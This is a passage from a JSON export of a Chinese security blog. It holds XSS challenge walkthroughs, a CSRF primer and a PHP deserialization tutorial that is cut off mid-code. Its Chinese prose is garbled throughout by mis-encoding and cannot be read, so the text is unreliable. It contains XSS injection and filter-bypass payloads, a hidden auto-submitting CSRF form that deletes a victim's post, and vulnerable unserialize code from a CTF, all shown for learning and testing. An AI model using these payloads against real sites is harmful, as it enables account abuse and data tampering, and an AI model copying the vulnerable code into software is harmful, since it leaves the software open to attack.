,è¿™é‡Œæœ‰å‡ ä¸ªå¸¸ç”¨çš„åˆ›å»º DOM èŠ‚ç‚¹æ–¹æ³•</p>\n<pre><code>createElement() åˆ›å»ºä¸€ä¸ªå…ƒç´ èŠ‚ç‚¹\ncreateTextNode() åˆ›å»ºä¸€ä¸ªæ–‡æœ¬èŠ‚ç‚¹\ncreateAttribute() åˆ›å»ºä¸€ä¸ªå±æ€§èŠ‚ç‚¹\ncreateComment() åˆ›å»ºä¸€ä¸ªæ³¨é‡ŠèŠ‚ç‚¹</code></pre><p>æµ‹è¯•æœ€åä¸€ä¸ªï¼š</p>\n<pre><code>document.createComment(11111);\n&lt;!-- 11111 --&gt;</code></pre><p>Payload: é—­åˆæ³¨é‡Š</p>\n<pre><code>Comment#&gt;&lt;iframe onload=alert(1)            &lt;!--&gt;&lt;iframe onload=alert(1)--&gt;</code></pre><h2 id=\"Skandia\"><a href=\"#Skandia\" class=\"headerlink\" title=\"Skandia\"></a>Skandia</h2><pre><code>function escape(s) {\n  return &apos;&lt;script&gt;console.log(&quot;&apos; + s.toUpperCase() + &apos;&quot;)&lt;/script&gt;&apos;;\n}</code></pre><p>å¯¹è¾“å…¥çš„ s å…¨éƒ¨å˜æˆå¤§å†™ï¼Œç›´æ¥è¾“å…¥ <code>alert</code> å˜æˆ <code>ALERT</code> ä¹‹åæ— æ³•æ‰§è¡Œã€‚</p>\n<p>åˆ©ç”¨ HTML ç¼–ç ç»•è¿‡</p>\n<pre><code>&lt;/script&gt;&lt;img src onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;</code></pre><p>å…³äºæµè§ˆå™¨å¦‚ä½•å¤„ç†ç¼–ç ï¼Œè´´ä¸€ç¯‡å¤§ä½¬åšå®¢ï¼š<a href=\"http://bobao.360.cn/learning/detail/292.html\" target=\"_blank\" rel=\"noopener\">http://bobao.360.cn/learning/detail/292.html</a></p>\n<h2 id=\"Callback\"><a href=\"#Callback\" class=\"headerlink\" title=\"Callback\"></a>Callback</h2><h1 id=\"http-xss-quiz-int21h-jp\"><a href=\"#http-xss-quiz-int21h-jp\" class=\"headerlink\" title=\"http://xss-quiz.int21h.jp\"></a><a href=\"http://xss-quiz.int21h.jp\" target=\"_blank\" rel=\"noopener\">http://xss-quiz.int21h.jp</a></h1><h2 id=\"Stage-3\"><a href=\"#Stage-3\" class=\"headerlink\" title=\"Stage 3\"></a>Stage 3</h2><p>å…ˆå°è¯• <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code></p>\n<p>æŸ¥çœ‹æºç å‘ç°è¢«è½¬ä¹‰æˆ</p>\n<pre><code>aaa&amp;lt;bbb&amp;gt;ccc/ddd&amp;#039;eee&amp;quot;fff;ggg:hhh</code></pre><p>çœ‹èµ·æ¥æ— æ³•æˆåŠŸäº†ï¼Œä½†æ˜¯æ—è¾¹è¿˜æœ‰ä¸ªä¸‹æ‹‰æ ï¼Œæˆ‘ä»¬æŠ“åŒ…è¯•è¯•ä¿®æ”¹ç¬¬äºŒä¸ªå‚æ•°ï¼š</p>\n<pre><code>p1=Lodan&amp;p2=&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></pre><p>It works! è¿™ä¸€å…³åªæ˜¯é˜²å¾¡äº†ç¬¬ä¸€ä¸ªæ ä½ï¼Œä»¥åè¦å¤šç•™å¿ƒç±»ä¼¼çš„ã€‚</p>\n<h2 id=\"Stage-4\"><a href=\"#Stage-4\" class=\"headerlink\" title=\"Stage 4\"></a>Stage 4</h2><p>çœ‹èµ·æ¥å’Œç¬¬ä¸‰å…³ä¸€æ ·ï¼Œä»ç„¶æ˜¯å…ˆæµ‹è¯•ï¼Œå‘ç°è¢«è½¬ä¹‰ï¼ŒæŠ“åŒ…å‘ç°å¤šäº†ä¸€ä¸ªå‚æ•° p3 ï¼Œé¦–å…ˆå¯¹æ–°å‚æ•°è¿›è¡Œæµ‹è¯•ï¼Œä¿®æ”¹æˆ <code>&lt;script&gt;alert(document.domain);&lt;/script&gt;</code> å‘åŒ…å‘ç°è¿˜æ˜¯å¤±è´¥ï¼ŒæŸ¥çœ‹æºç ä¹‹åä¸ç¬¬äºŒå…³ä¸€æ ·é—­åˆ <code>&quot;&gt;</code> å³å¯ã€‚</p>\n<h2 id=\"Stage-5\"><a href=\"#Stage-5\" class=\"headerlink\" title=\"Stage 5\"></a>Stage 5</h2><p>è¿˜æ˜¯å…ˆæµ‹è¯•ï¼š <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> </p>\n<p>å‘ç°åªæ˜¾ç¤ºäº†ä¸€æ®µï¼Œ<code>F12</code> ï¼Œä¿®æ”¹é•¿åº¦å†æµ‹</p>\n<p>æ²¡æœ‰è¿‡æ»¤ã€‚</p>\n<p>å¥½äº†ï¼Œä¿®æ”¹é•¿åº¦ï¼Œç›´æ¥æ’å…¥å§ï¼ </p>\n<p>è¯•å®Œæ²¡æˆåŠŸï¼Œå†çœ‹çœ‹æºç ï¼ŒåŸæ¥æ˜¯æ²¡é—­åˆ <code>value</code> ï¼Œæ‰‹åŠ¨é—­åˆæäº¤ï¼š</p>\n<p>stage5 çš„ä½œç”¨åªæ˜¯æƒ³å‘Šè¯‰æˆ‘ä»¬ <strong>å®¢æˆ·ç«¯çš„é˜²æŠ¤æ˜¯æ— æ•ˆçš„</strong></p>\n<h2 id=\"Stage-6\"><a href=\"#Stage-6\" class=\"headerlink\" title=\"Stage 6\"></a>Stage 6</h2><p>è¿˜æ˜¯å…ˆæµ‹è¯•ï¼š <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> , <code>&lt; &gt;</code>è¢«è½¬ä¹‰ï¼Œè€Œä¸”æ²¡æœ‰å…¶ä»–çš„æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„æ ä½ï¼Œè¿™æ€ä¹ˆæï¼Ÿ</p>\n<p>ç­”æ¡ˆæ˜¯ç”¨ html è¯­æ³•ï¼ŒXSSä¸æ˜¯åªèƒ½æ’å…¥ JS ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ HTML è¯­æ³•ï¼Œä¸ç”¨ <code>&lt;&gt;/</code> åˆ©ç”¨äº‹ä»¶è§¦å‘</p>\n<pre><code>&quot; onclick=alert(document.domain); &quot;</code></pre><h2 id=\"Stage-7\"><a href=\"#Stage-7\" class=\"headerlink\" title=\"Stage 7\"></a>Stage 7</h2><p>è¿˜æ˜¯å…ˆæµ‹è¯•ï¼š <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> ,è¿™æ¬¡è¿ <code>&quot;</code> éƒ½è½¬ç§»äº†</p>\n<p>è¿˜æ˜¯ä½¿ç”¨ html è¯­æ³•ï¼Œä½¿ç”¨ç©ºæ ¼åˆ†å‰²å±æ€§ï¼ŒåŠ å…¥ä¸€ä¸ª <code>&quot;</code> æ¥ç»“æŸå‰é¢çš„è¯­å¥</p>\n<h2 id=\"Stage-8\"><a href=\"#Stage-8\" class=\"headerlink\" title=\"Stage 8\"></a>Stage 8</h2><p>è¿˜æ˜¯å…ˆæµ‹è¯•ï¼š <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> , è¿™æ¬¡æ˜¯å°†è¾“å…¥æ’å…¥åˆ°è¶…é“¾æ¥é‡Œï¼Œæˆ‘ä»¬ç›´æ¥æ’å…¥</p>\n<pre><code>&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></pre><p>è¡Œä¸é€šï¼Œå› ä¸ºæˆ‘ä»¬ç‚¹é“¾æ¥å‘ç°æ˜¯ <code>404</code> ï¼Œæ¢æˆ <code>JavaScript</code> è¯•è¯•</p>\n<pre><code>javascript:alert(document.domain);</code></pre><p>æ’å…¥åç‚¹å‡»é“¾æ¥ï¼š</p>\n<h2 id=\"Stage-9\"><a href=\"#Stage-9\" class=\"headerlink\" title=\"Stage 9\"></a>Stage 9</h2><p>ä¸æ”¯æŒ UTF-7 ç¼–ç ï¼Œæ‰€ä»¥è·³è¿‡</p>\n<h2 id=\"Stage-10\"><a href=\"#Stage-10\" class=\"headerlink\" title=\"Stage 10\"></a>Stage 10</h2><h1 id=\"å‚è€ƒé“¾æ¥\"><a href=\"#å‚è€ƒé“¾æ¥\" class=\"headerlink\" title=\"å‚è€ƒé“¾æ¥\"></a>å‚è€ƒé“¾æ¥</h1><blockquote>\n<p><a href=\"https://blog.davidh83110.com/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/%E9%A7%AD%E5%AE%A2%E6%8A%80%E8%A1%93/owasp%20top10/2016/10/10/xss.html\" target=\"_blank\" rel=\"noopener\">https://blog.davidh83110.com/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/%E9%A7%AD%E5%AE%A2%E6%8A%80%E8%A1%93/owasp%20top10/2016/10/10/xss.html</a></p>\n</blockquote>\n","text":"xsså¤‡å¿˜11/1/2019 10:50:21 AM DVWAreflectedlow&lt;script&gt;alert(1);&lt;/script&gt;medium&lt;scRiPt&gt;alert(1);&lt;/script&gt;high&lt;?phphea","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"XSS","slug":"XSS","count":1,"path":"api/tags/XSS.json"}]},{"title":"CSRF ç®€å•è®¤è¯†","slug":"CSRF-ç®€å•å­¦ä¹ ","date":"2019-12-22T03:47:20.000Z","updated":"2019-12-22T04:22:38.699Z","comments":true,"path":"api/articles/CSRF-ç®€å•å­¦ä¹ .json","excerpt":"","keywords":null,"cover":"https://wx3.sinaimg.cn/small/006boCb9ly1ga5drxec7uj30su014jr9.jpg","content":"<h1 id=\"CSRF-ç®€å•è®¤è¯†\"><a href=\"#CSRF-ç®€å•è®¤è¯†\" class=\"headerlink\" title=\"CSRF ç®€å•è®¤è¯†\"></a>CSRF ç®€å•è®¤è¯†</h1><p>12/22/2019 11:47:20 AM </p>\n<h2 id=\"ä»€ä¹ˆæ˜¯CSRF\"><a href=\"#ä»€ä¹ˆæ˜¯CSRF\" class=\"headerlink\" title=\"ä»€ä¹ˆæ˜¯CSRF\"></a>ä»€ä¹ˆæ˜¯CSRF</h2><p>è·¨ç«™è¯·æ±‚ä¼ªé€ -Cross Site Request Forgeryï¼Œä¹Ÿè¢«ç§°ä½œXSRFï¼Œç®€å•æ¥è¯´å°±æ˜¯ æ”»å‡»è€…åœ¨ä¸çŸ¥é“æŸä¸ªè´¦æˆ·è´¦å·å¯†ç çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ç›®æ ‡ç«™ç‚¹å·²ç»ç™»é™†è¿‡çš„è´¦æˆ·äº§ç”Ÿçš„èº«ä»½å‡­è¯ä¿¡æ¯(cookie)æ¥è¿›è¡Œä¸€ç³»åˆ—æ“ä½œï¼ŒåŒæ—¶è¯¥ç«™ç‚¹è®¤ä¸ºæ”»å‡»è€…æ‰€é‡‡å–çš„åŠ¨ä½œéƒ½æ˜¯åˆæ³•çš„(å› ä¸ºæ”»å‡»è€…ç›—ç”¨äº†è®¤è¯é€šè¿‡çš„è´¦æˆ·è´¦å·ä¿¡æ¯)ã€‚</p>\n<h2 id=\"æ¼æ´åˆ©ç”¨\"><a href=\"#æ¼æ´åˆ©ç”¨\" class=\"headerlink\" title=\"æ¼æ´åˆ©ç”¨\"></a>æ¼æ´åˆ©ç”¨</h2><p>å¦‚æœå¯¹äºæŸä¸ªç½‘ç«™çš„åˆ é™¤æ–‡ç« åŠŸèƒ½çš„ä»£ç æ˜¯ </p>\n<pre><code>&lt;a href=&apos;/delete?id=3&apos;&gt;åˆªé™¤&lt;/a&gt;</code></pre><p>ç„¶ååœ¨åç«¯åšæ ¡éªŒï¼ŒéªŒè¯ requests æœ‰æ²¡æœ‰å¸¦ session_id ,åŒæ—¶ç¡®è®¤æ˜¯ä¸æ˜¯è¿™ä¸ªæ–‡ç« çš„ä½œè€…ã€‚æ­¤æ—¶ï¼Œå‡å¦‚æ”»å‡»è€…é€šè¿‡é’“é±¼ï¼Œåˆ›å»ºäº†ä¸€ä¸ªæœ‰é’ˆå¯¹æ€§çš„ç½‘é¡µï¼Œé‡Œé¢çš„æŒ‰é’®çš„ä»£ç æ˜¯ï¼š</p>\n<pre><code>&lt;a href=&apos;https://small-min.blog.com/delete?id=3&apos;&gt;é–‹å§‹æ¸¬é©—&lt;/a&gt;</code></pre><p>å¦‚æœè¿™æ—¶æ–‡ç« ä½œè€…ç‚¹å‡»äº†æŒ‰é’®ï¼Œé‚£ä¹ˆç”±äºæµè§ˆå™¨çš„è·¨åŸŸè¯·æ±‚æœºåˆ¶(åœ¨æµè§ˆå™¨è¿›ç¨‹çš„ç”Ÿå‘½å‘¨æœŸå†…ï¼Œå³ä½¿æµè§ˆå™¨æ‰“å¼€äº†æ–°çš„Tabé¡µï¼ŒSession Cookie ä¹Ÿæ˜¯æœ‰æ•ˆçš„ã€‚Session Cookie ä¿å­˜åœ¨æµè§ˆå™¨å†…å­˜ç©ºé—´å†…)ä¼šæŠŠä½œè€…çš„cookieä¸€èµ·å¸¦åˆ°GETè¯·æ±‚ä¸­ï¼ŒæœåŠ¡ç«¯æ£€æŸ¥åˆ°ç¡®å®æ˜¯ä½œè€…ï¼Œäºæ˜¯æ–‡ç« è¢«åˆ é™¤äº†ã€‚</p>\n<p>å¦‚æœç¦ç”¨äº† <code>&lt;img&gt; ã€ &lt;iframe&gt; ã€ &lt;script&gt;</code> ç­‰å¸¦ src å±æ€§çš„æ ‡ç­¾ï¼Œå°±å¯ä»¥ç¦æ­¢ CSRF äº†ï¼Ÿè¿™ç±»æ ‡ç­¾åªèƒ½å‘èµ·ä¸€æ¬¡ GET è¯·æ±‚ï¼Œè€Œä¸èƒ½å‘èµ· POST è¯·æ±‚ã€‚ä½†æ˜¯ <code>form</code> æ ‡ç­¾å¯ä»¥å‘é€ POST request.</p>\n<pre><code>&lt;form action=&quot;https://small-min.blog.com/delete&quot; method=&quot;POST&quot;&gt;\n  &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;3&quot;/&gt;\n  &lt;input type=&quot;submit&quot; value=&quot;é–‹å§‹æ¸¬é©—&quot;/&gt;\n&lt;/form&gt;</code></pre><p>è¿™æ ·è¿˜æ˜¯æ˜¾å¼çš„ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨æ›´éšè”½çš„æ–¹å¼</p>\n<pre><code>&lt;iframe style=&quot;display:none&quot; name=&quot;csrf-frame&quot;&gt;&lt;/iframe&gt;\n&lt;form method=&apos;POST&apos; action=&apos;https://small-min.blog.com/delete&apos; target=&quot;csrf-frame&quot; id=&quot;csrf-form&quot;&gt;\n  &lt;input type=&apos;hidden&apos; name=&apos;id&apos; value=&apos;3&apos;&gt;\n  &lt;input type=&apos;submit&apos; value=&apos;submit&apos;&gt;\n&lt;/form&gt;\n&lt;script&gt;document.getElementById(&quot;csrf-form&quot;).submit()&lt;/script&gt;</code></pre><p>åœ¨æŸäº›é¡µé¢ä¸­å¯èƒ½è¿›è¡Œäº† referer æ£€æŸ¥ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹Ÿè¦æ£€æµ‹æ˜¯å¦å­˜åœ¨é€»è¾‘é—®é¢˜ï¼š</p>\n<ol>\n<li>Referer è¿‡æ»¤ä¸ä¸¥è°¨</li>\n</ol>\n<p>æ¯”å¦‚æˆ‘æ„é€ äº†ä¸€ä¸ªè¡¨å• <strong>register</strong></p>\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;csrf test&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;form action=&quot;../csrf/server.php&quot; id= &quot;regesiter&quot; method=&quot;post&quot;&gt;\n    &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot; /&gt;\n    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;</code></pre><p>åœ¨ server.php ä¸­æˆ‘å¯¹ referer è¿›è¡Œäº†æ£€æµ‹ï¼Œå¦‚æœå«æœ‰ qq.com æˆ‘å°±å¯ä»¥è®¤ä¸ºæ˜¯åˆæ³•çš„ï¼Œä½†æ˜¯å¦‚æœæˆ‘é‡‡å–ä»¥ä¸‹çš„è¯·æ±‚æ–¹å¼ï¼š</p>\n<p><img src=\"https://wx3.sinaimg.cn/small/006boCb9ly1ga5drxec7uj30su014jr9.jpg\" alt=\"æ„é€ è¯·æ±‚\"></p>\n<p><img src=\"https://wx4.sinaimg.cn/small/006boCb9ly1ga5druqi6ej30df047glu.jpg\" alt=\"refererå·²ç»å«æœ‰å…³é”®è¯\"></p>\n<ol start=\"2\">\n<li>ç©ºreferer</li>\n</ol>\n<p>æŸäº›æµè§ˆå™¨çš„é˜²å¾¡éƒ¨ç½²æ˜¯å…è®¸ç©º REFERER çš„ã€‚</p>\n<p>è¿˜å¯ä»¥ä½¿ç”¨ burp è‡ªå¸¦çš„ generate CSRF poc,é€‰æ‹©æµ‹è¯• URL å³é”®é€‰æ‹©ç”Ÿæˆ CSRF poc,å°†è¦æ›¿æ¢çš„å€¼ç„¶åä¿å­˜è®¿é—®å³å¯ã€‚</p>\n<p>è¿˜å¯ä»¥ä½¿ç”¨ CSRFTester è½¯ä»¶æ¥æµ‹è¯•</p>\n<h2 id=\"æ¼æ´æ£€æµ‹\"><a href=\"#æ¼æ´æ£€æµ‹\" class=\"headerlink\" title=\"æ¼æ´æ£€æµ‹\"></a>æ¼æ´æ£€æµ‹</h2><ol>\n<li>GET</li>\n</ol>\n<p>å¦‚æœå¸¦æœ‰ token ç­‰éªŒè¯å‚æ•°ï¼Œå…ˆå»æ‰å‚æ•°å°è¯•èƒ½å¦æ­£å¸¸è¯·æ±‚ï¼Œå¦‚æœå¯ä»¥å³å­˜åœ¨ CSRF æ¼æ´ã€‚</p>\n<ol start=\"2\">\n<li>POST</li>\n</ol>\n<p>æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯æŠ“å–ä¸€ä¸ªæ­£å¸¸è¯·æ±‚çš„æ•°æ®åŒ…ï¼Œå»æ‰ token ç­‰éªŒè¯å‚æ•°åæäº¤ï¼Œå¦‚æœæ­£å¸¸è®¿é—®ï¼Œå†å»æ‰ Referer åé‡æ–°æäº¤ï¼Œå¦‚æœæäº¤è¿˜æœ‰æ•ˆï¼Œé‚£ä¹ˆåŸºæœ¬å¯ä»¥è®¤ä¸ºå­˜åœ¨ CSRF æ¼æ´ï¼Œå¯ä»¥æ„é€ å¤–éƒ¨ form è¡¨å•æ¥è¿›è¡Œæäº¤ã€‚å¦‚æœå»æ‰ referer å¤±è´¥è¿˜å¯ä»¥éªŒè¯å¯¹ referer æ ¡éªŒæ˜¯å¦ä¸¥æ ¼å°è¯•ç»•è¿‡ã€‚ä¹Ÿå¯èƒ½å­˜åœ¨ä»£ç å¯¹è¯·æ±‚ç±»å‹åˆ¤æ–­ä¸ä¸¥æ ¼($_REQUEST[])ï¼Œå¦‚æœ post å¤±è´¥äº†å°è¯•æ”¹æˆ get è¿›è¡Œè¯·æ±‚ã€‚ </p>\n<h2 id=\"é˜²å¾¡\"><a href=\"#é˜²å¾¡\" class=\"headerlink\" title=\"é˜²å¾¡\"></a>é˜²å¾¡</h2><h3 id=\"éªŒè¯ç \"><a href=\"#éªŒè¯ç \" class=\"headerlink\" title=\"éªŒè¯ç \"></a>éªŒè¯ç </h3><p>å¼ºåˆ¶ç”¨æˆ·å¿…é¡»ä¸åº”ç”¨å®Œæˆäº¤äº’ï¼Œé¿å…åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ„é€ ç½‘ç»œè¯·æ±‚</p>\n<h3 id=\"Referer-Check\"><a href=\"#Referer-Check\" class=\"headerlink\" title=\"Referer Check\"></a>Referer Check</h3><p>æ£€æŸ¥è¯·æ±‚æ˜¯å¦æ¥è‡ªåˆæ³•çš„æºï¼Œä½†æ˜¯ä¸è¶³ä¹‹å¤„åœ¨äºæµè§ˆå™¨å¹¶éä»€ä¹ˆæ—¶å€™éƒ½èƒ½å–åˆ°Referer.</p>\n<h3 id=\"Anti-CSRF-Token\"><a href=\"#Anti-CSRF-Token\" class=\"headerlink\" title=\"Anti CSRF Token\"></a>Anti CSRF Token</h3><p>å°†å‚æ•°åŠ å¯†ï¼Œæˆ–è€…ä½¿ç”¨ä¸€äº›çœŸéšæœºæ•°ï¼Œè®©æ”»å‡»è€…æ— æ³•çŒœæµ‹åˆ°å‚æ•°å€¼ï¼Œè¾¾åˆ°â€œä¸å¯é¢„æµ‹æ€§åŸåˆ™â€ã€‚å¯ä»¥æ–°åŠ ä¸€ä¸ªå‚æ•° TOKEN ï¼ŒåŒæ—¶æ”¾åœ¨è¡¨å•å’Œ session ä¸­ï¼ŒæœåŠ¡ç«¯åªéœ€éªŒè¯è¡¨å•ä¸­çš„ TOKEN å’Œ session ä¸­çš„ Token æ˜¯å¦ä¸€è‡´ï¼Œä¸€è‡´åˆ™è®¤ä¸ºæ˜¯åˆæ³•è¯·æ±‚ã€‚ </p>\n","text":"CSRF ç®€å•è®¤è¯†12/22/2019 11:47:20 AM ä»€ä¹ˆæ˜¯CSRFè·¨ç«™è¯·æ±‚ä¼ªé€ -Cross Site Request Forgeryï¼Œä¹Ÿè¢«ç§°ä½œXSRFï¼Œç®€å•æ¥è¯´å°±æ˜¯ æ”»å‡»è€…åœ¨ä¸çŸ¥é“æŸä¸ªè´¦æˆ·è´¦å·å¯†ç çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ç›®æ ‡ç«™ç‚¹å·²ç»ç™»é™†è¿‡çš„è´¦æˆ·äº§ç”Ÿçš„èº«ä»½å‡­è¯ä¿¡æ¯(cookie)","link":"","raw":null,"photos":[],"categories":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","count":5,"path":"api/categories/æ¸—é€æµ‹è¯•.json"}],"tags":[{"name":"CSRF","slug":"CSRF","count":1,"path":"api/tags/CSRF.json"}]},{"title":"åºåˆ—åŒ–ä¸ååºåˆ—åŒ–","slug":"åºåˆ—åŒ–ä¸ååºåˆ—åŒ–","date":"2019-12-12T03:47:20.000Z","updated":"2020-05-05T06:02:50.440Z","comments":true,"path":"api/articles/åºåˆ—åŒ–ä¸ååºåˆ—åŒ–.json","excerpt":"","keywords":null,"cover":"https://i.imgur.com/pBO7lBu.png","content":"<h1 id=\"åºåˆ—åŒ–ä¸ååºåˆ—åŒ–\"><a href=\"#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–\" class=\"headerlink\" title=\"åºåˆ—åŒ–ä¸ååºåˆ—åŒ–\"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h1><h2 id=\"0x01ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–\"><a href=\"#0x01ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–\" class=\"headerlink\" title=\"0x01ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–\"></a>0x01ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–</h2><p>phpå…è®¸ä¿å­˜ä¸€ä¸ªå¯¹è±¡æ–¹ä¾¿ä»¥åé‡ç”¨ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºåºåˆ—åŒ–ã€‚åœ¨ä¼ é€’å˜é‡çš„è¿‡ç¨‹ä¸­æœ‰å¯èƒ½é‡åˆ°å˜é‡å€¼è·¨è„šæœ¬ä¼ è¾“çš„è¿‡ç¨‹ã€‚æ¯”å¦‚æ–‡ä»¶ç»“æ„æ˜¯è¿™æ ·çš„ï¼š</p>\n<p><img src=\"https://i.imgur.com/pBO7lBu.png\" alt></p>\n<p>å…¶ä¸­index.phpä»£ç å¦‚ä¸‹ï¼š</p>\n<pre><code>&lt;?php \n@highlight_file(__FILE__);\nrequire_once(&apos;shield.php&apos;);\n$x = new Shield();\nisset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];\nif (!empty($g)) {\n    $x = unserialize($g);\n}\necho $x-&gt;readfile();\n?&gt;</code></pre><p>å¯ä»¥çœ‹å‡ºæ¥$xå°±æ˜¯è·¨è„šæœ¬ä¼ è¾“çš„å˜é‡ã€‚</p>\n<p>å¦‚æœåœ¨ä¸€ä¸ªè„šæœ¬è°ƒç”¨è·¨è„šæœ¬ä¼ è¾“çš„å˜é‡ä¹‹å‰ï¼Œå‰ä¸€ä¸ªåŒ…å«è¯¥å˜é‡çš„è„šæœ¬å·²ç»æ‰§è¡Œç»“æŸæ‰€æœ‰çš„å˜é‡å’Œå†…å®¹éƒ½å·²ç»é‡Šæ”¾æ‰äº†ï¼Œè¿™æ—¶ï¼Œæˆ‘ä»¬ä¸èƒ½è®©å‰ä¸€ä¸ªè„šæœ¬ä¸æ–­å¾ªç¯æ‰§è¡Œç­‰å¾…åé¢çš„è„šæœ¬å»è°ƒç”¨ã€‚serializeå’Œunserialize å°±æ˜¯è§£å†³è¿™ä¸€é—®é¢˜çš„ã€‚serializeå°†å˜é‡è½¬æ¢ä¸ºå­—ç¬¦ä¸²å¹¶ä¸”åœ¨è½¬æ¢è¿‡ç¨‹ä¸­ä¿å­˜å½“å‰å˜é‡çš„å€¼;unserializeåˆ™å°†serializeç”Ÿæˆçš„å­—ç¬¦ä¸²å˜å›æˆå˜é‡ã€‚</p>\n<p>çœ‹ä¸€ä¸ªä¾‹å­ï¼Œç®€å•çš„åˆ†æä¸€ä¸‹ï¼š</p>\n<pre><code>&lt;?php\nclass Test\n{\npublic $age = 0;\npublic $name = &apos;brain&apos;;\n\npublic function PrintInfo()\n{\n    echo &apos;[+]User: &apos;.$this-&gt;name .&apos;: is&apos; . $this-&gt;age .&apos;years old.&apos;;\n}\n}\n$user =  new Test();\n$user-&gt;age = 20;\n$user-&gt;name = &apos;Jack&apos;;\n$user-&gt;PrintInfo();\necho serialize($user);\n\n?&gt;</code></pre><p>è¾“å‡ºç»“æœå¦‚ä¸‹</p>\n<p><img src=\"https://i.imgur.com/bqenWI4.png\" alt></p>\n<p>ä½¿ç”¨unserializeåˆ™ä¼šä½¿è¿™ä¸²<strong>å­—ç¬¦ä¸²</strong>æ¢å¤æˆ<strong>ç±»å¯¹è±¡</strong>ã€‚</p>\n<h2 id=\"é­”æ³•å‡½æ•°\"><a href=\"#é­”æ³•å‡½æ•°\" class=\"headerlink\" title=\"é­”æ³•å‡½æ•°\"></a>é­”æ³•å‡½æ•°</h2><p>ä¸€å…±æœ‰å‡ ä¸ªé­”æ³•å‡½æ•°éœ€è¦æ³¨æ„ï¼Œè¿™æ˜¯ä¾‹å­ï¼š</p>\n<pre><code>&lt;?php\nclass Test\n{\npublic $variable = &quot;BRAIN&quot;;\npublic $variable1 = &quot;BRAVO&quot;;\npublic function PrintVariable()\n{\n    echo $this-&gt;variable . &apos;&lt;br /&gt;&apos;;\n}\npublic function __construct()\n{\n    echo &apos;__construct&apos;.&apos;&lt;br&gt;&apos;;\n}\npublic function __destruct()\n{\n    echo &apos;__destruct&lt;br /&gt;&apos;;\n}\npublic function __wakeup()\n{\n    echo &apos;__wakeup&lt;br /&gt;&apos;;\n}\npublic function __sleep()\n{\n    echo &apos;__sleep&lt;br /&gt;&apos;;\n    return array(&apos;variable&apos; , &apos;variable1&apos;);\n}\n}    \n$obj = new Test();  //åˆ›å»ºå¯¹è±¡æ—¶è°ƒç”¨__construct\n\n$serialized = serialize($obj); //åºåˆ—åŒ–å¯¹è±¡æ—¶è°ƒç”¨__sleep\n\nprint(&apos;Serialized: &apos;.$serialized . &apos;&lt;br /&gt;&apos;);\n\n$obj2 = unserialize($serialized); //é‡å»ºå¯¹è±¡è°ƒç”¨ __wakeup\n\n$obj2-&gt;PrintVariable(); //è°ƒç”¨æ–¹æ³•è¾“å‡ºæ•°æ®\n//è„šæœ¬ç»“æŸè°ƒç”¨__destruct\n?&gt;</code></pre><p>è¿™æ˜¯æ‰§è¡Œç»“æœï¼š</p>\n<p><img src=\"https://i.imgur.com/Eb6Ax4I.png\" alt></p>\n<p>å¯ä»¥çœ‹åˆ°å„ä¸ªå‡½æ•°çš„æ‰§è¡Œé¡ºåºã€‚</p>\n<h2 id=\"æ¼æ´äº§ç”Ÿ\"><a href=\"#æ¼æ´äº§ç”Ÿ\" class=\"headerlink\" title=\"æ¼æ´äº§ç”Ÿ\"></a>æ¼æ´äº§ç”Ÿ</h2><p>ååºåˆ—åŒ–çš„å±å®³å°±åœ¨äºååºåˆ—åŒ–åçš„å­—ç¬¦ä¸²å‚æ•°è¢«ç”¨æˆ·å¯æ§ï¼Œä»è€Œåœ¨åºåˆ—åŒ–ä¹‹åé€ æˆä¸å¯é¢„æ–™çš„é—®é¢˜ã€‚</p>\n<p>æ‹¿ä¸€é“ctfé¢˜ä¸¾ä¾‹ï¼Œæ–‡ä»¶ç»“æ„å°±æ˜¯æ–‡ç« å¼€å¤´æåˆ°çš„ç»“æ„</p>\n<pre><code>    idnex.php\n\n&lt;?php \n@highlight_file(__FILE__);\nrequire_once(&apos;shield.php&apos;);\n$x = new Shield();\nisset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];\nif (!empty($g)) {\n    $x = unserialize($g);\n}\necho $x-&gt;readfile();\n?&gt;\n\n\nshield.php\n\n&lt;?php\n//flag is in pctf.php\nclass Shield {\n    public $file;\n    function __construct($filename = &apos;&apos;) {\n        $this -&gt; file = $filename;\n    }\n    function readfile() {\n        if (!empty($this-&gt;file) &amp;&amp; 